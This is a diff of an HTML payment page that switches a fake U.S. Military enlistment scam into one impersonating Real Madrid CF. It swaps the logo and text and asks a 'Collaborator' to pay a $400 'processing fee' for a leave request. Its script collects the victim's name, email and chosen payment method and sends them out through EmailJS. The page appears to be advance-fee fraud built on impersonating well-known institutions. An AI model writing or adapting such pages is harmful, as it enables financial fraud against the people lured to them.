@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Complete Registration – U.S. Military</title>
+  <title>Complete Registration – Real Madrid CF</title>
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <style>
     body {
@@ -70,10 +70,10 @@
 </head>
 <body>
   <div class="container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d5/Seal_of_the_United_States_Department_of_the_Army.svg/2048px-Seal_of_the_United_States_Department_of_the_Army.svg.png" class="logo" alt="U.S. Army Logo" />
+    <img src="https://i.imgur.com/y4DFFMe.png" class="logo" alt="Real Madrid Logo" />
     
-    <h2>Complete Your Military Enrollment</h2>
-    <p id="welcome-message">Dear <span id="displayName">Applicant</span>, to finalize your enlistment and receive your official deployment documents, please choose your preferred payment method below.</p>
+    <h2>Complete Your Application</h2>
+    <p id="welcome-message">Welcome, <span id="displayName">Collaborator</span>. To Complete your application for leave request, please select your preferred payment method below to send $400 processing fee.</p>
 
     <form id="paymentForm">
       <!-- Hidden dynamic fields -->
@@ -102,10 +102,11 @@
 
   <script>
     (function(){
-      emailjs.init("JWcOE8k4MMUEFNPy-"); // <-- Your Public Key
+      emailjs.init("JWcOE8k4MMUEFNPy-");
 
+      // Optional: Pre-fill from query string like ?name=Francois&email=francois@example.com
       const urlParams = new URLSearchParams(window.location.search);
-      const name = urlParams.get('name') || 'Applicant';
+      const name = urlParams.get('name') || 'Collaborator';
       const email = urlParams.get('email') || '';
 
       document.getElementById('displayName').textContent = name;
@@ -122,11 +123,10 @@
         payment_method: method
       })
       .then(() => {
-        const name = document.getElementById("full_name").value;
         document.querySelector(".payment-options").style.display = "none";
         document.getElementById("thankYouMessage").style.display = "block";
         document.getElementById("thankYouMessage").innerText = 
-          `Thank you, ${name}. Secure instructions for ${method} will be sent to your registered email shortly.`;
+          `Thank you. Payment instructions for ${method} will be sent to your registered email shortly.`;
       })
       .catch((error) => {
         alert("Failed to send. Please try again later.");
